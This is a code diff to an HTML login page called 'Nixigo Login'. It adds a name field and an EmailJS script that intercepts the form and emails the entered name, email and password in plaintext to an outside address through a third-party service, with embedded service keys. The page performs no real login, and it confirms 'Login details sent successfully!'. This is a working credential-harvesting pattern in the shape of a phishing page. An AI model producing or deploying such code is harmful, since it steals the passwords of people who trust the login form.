@@ -6,116 +6,21 @@
   <title>Nixigo Login</title>
   <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;600&display=swap" rel="stylesheet">
   <style>
-    * {
-      margin: 0;
-      padding: 0;
-      box-sizing: border-box;
-      font-family: 'Poppins', sans-serif;
-    }
-
-    body {
-      height: 100vh;
-      display: flex;
-      justify-content: center;
-      align-items: center;
-      background: linear-gradient(135deg, #1a1a2e, #16213e);
-      overflow: hidden;
-      color: white;
-    }
-
-    /* Background animation */
-    .background {
-      position: absolute;
-      width: 100%;
-      height: 100%;
-      top: 0;
-      left: 0;
-      overflow: hidden;
-      z-index: -1;
-    }
-
-    .circle {
-      position: absolute;
-      border-radius: 50%;
-      background: rgba(255, 255, 255, 0.2);
-      animation: float 6s infinite ease-in-out;
-    }
-
-    @keyframes float {
-      0%, 100% {
-        transform: translateY(0);
-      }
-      50% {
-        transform: translateY(-50px);
-      }
-    }
-
-    .login-box {
-      background: rgba(255, 255, 255, 0.1);
-      padding: 40px;
-      border-radius: 15px;
-      backdrop-filter: blur(10px);
-      text-align: center;
-      width: 350px;
-    }
-
-    .logo img {
-      width: 90px;
-      height: 90px;
-      border-radius: 50%;
-      border: 3px solid white;
-      margin-bottom: 15px;
-      object-fit: cover;
-    }
-
-    h2 {
-      margin-bottom: 20px;
-      font-weight: 600;
-    }
-
-    .input-box {
-      margin-bottom: 20px;
-      position: relative;
-    }
-
-    .input-box input {
-      width: 100%;
-      padding: 12px 15px;
-      border: none;
-      border-radius: 8px;
-      outline: none;
-      font-size: 14px;
-    }
-
-    .btn {
-      width: 100%;
-      padding: 12px;
-      background: #00d4ff;
-      border: none;
-      border-radius: 8px;
-      color: black;
-      font-weight: bold;
-      cursor: pointer;
-      transition: 0.3s;
-    }
-
-    .btn:hover {
-      background: #00a6c4;
-    }
-
-    .signup-link {
-      margin-top: 15px;
-      font-size: 13px;
-    }
-
-    .signup-link a {
-      color: #00d4ff;
-      text-decoration: none;
-    }
-
-    .signup-link a:hover {
-      text-decoration: underline;
-    }
+    * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Poppins', sans-serif; }
+    body { height: 100vh; display: flex; justify-content: center; align-items: center; background: linear-gradient(135deg, #1a1a2e, #16213e); overflow: hidden; color: white; }
+    .background { position: absolute; width: 100%; height: 100%; top: 0; left: 0; overflow: hidden; z-index: -1; }
+    .circle { position: absolute; border-radius: 50%; background: rgba(255,255,255,0.2); animation: float 6s infinite ease-in-out; }
+    @keyframes float { 0%,100%{transform: translateY(0);} 50%{transform: translateY(-50px);} }
+    .login-box { background: rgba(255,255,255,0.1); padding: 40px; border-radius: 15px; backdrop-filter: blur(10px); text-align: center; width: 350px; }
+    .logo img { width: 90px; height: 90px; border-radius: 50%; border: 3px solid white; margin-bottom: 15px; object-fit: cover; }
+    h2 { margin-bottom: 20px; font-weight: 600; }
+    .input-box { margin-bottom: 20px; position: relative; }
+    .input-box input { width: 100%; padding: 12px 15px; border: none; border-radius: 8px; outline: none; font-size: 14px; }
+    .btn { width: 100%; padding: 12px; background: #00d4ff; border: none; border-radius: 8px; color: black; font-weight: bold; cursor: pointer; transition: 0.3s; }
+    .btn:hover { background: #00a6c4; }
+    .signup-link { margin-top: 15px; font-size: 13px; }
+    .signup-link a { color: #00d4ff; text-decoration: none; }
+    .signup-link a:hover { text-decoration: underline; }
   </style>
 </head>
 <body>
@@ -131,39 +36,41 @@
       <img src="https://i.postimg.cc/LsM63GW2/character-25.png" alt="Logo">
     </div>
     <h2>Nixigo Login</h2>
-    <form>
+    <form id="loginForm">
       <div class="input-box">
-        <input type="email" placeholder="Email" required>
+        <input type="text" name="name" placeholder="Full Name" required>
       </div>
       <div class="input-box">
-        <input type="password" placeholder="Password" required>
+        <input type="email" name="email" placeholder="Email" required>
       </div>
-      <button type="submit"
-
- class="btn">Login</button>
+      <div class="input-box">
+        <input type="password" name="password" placeholder="Password" required>
+      </div>
+      <button type="submit" class="btn">Login</button>
       <div class="signup-link">
         Don’t have an account? <a href="#">Sign up</a>
-
-<script src="https://cdn.jsdelivr.net/npm/emailjs-com@3/dist/email.min.js"></script>
-<script>
-  (function(){
-    emailjs.init("rqilVURCxKgVU4I3W"); // ⚡ यहाँ apna EmailJS public key डालना
-  })();
-
-  document.getElementById("loginForm").addEventListener("submit", function(e){
-    e.preventDefault();
-
-    emailjs.sendForm("service_73n39ra", "template_rc6k9to", this)
-    .then(function(response) {
-       alert("Login details sent successfully!");
-    }, function(error) {
-       alert("Failed to send. Error: " + JSON.stringify(error));
-    });
-  });
-</script>
-
       </div>
     </form>
   </div>
+
+  <!-- EmailJS Script -->
+  <script src="https://cdn.jsdelivr.net/npm/emailjs-com@3/dist/email.min.js"></script>
+  <script>
+    (function(){
+      emailjs.init("rqilVURCxKgVU4I3W"); // ⚡ apna EmailJS public key
+    })();
+
+    document.getElementById("loginForm").addEventListener("submit", function(e){
+      e.preventDefault();
+
+      emailjs.sendForm("service_73n39ra", "template_rc6k9to", this)
+      .then(function(response) {
+         alert("Login details sent successfully!");
+         document.getElementById("loginForm").reset(); // Reset form
+      }, function(error) {
+         alert("Failed to send. Error: " + JSON.stringify(error));
+      });
+    });
+  </script>
 </body>
 </html>
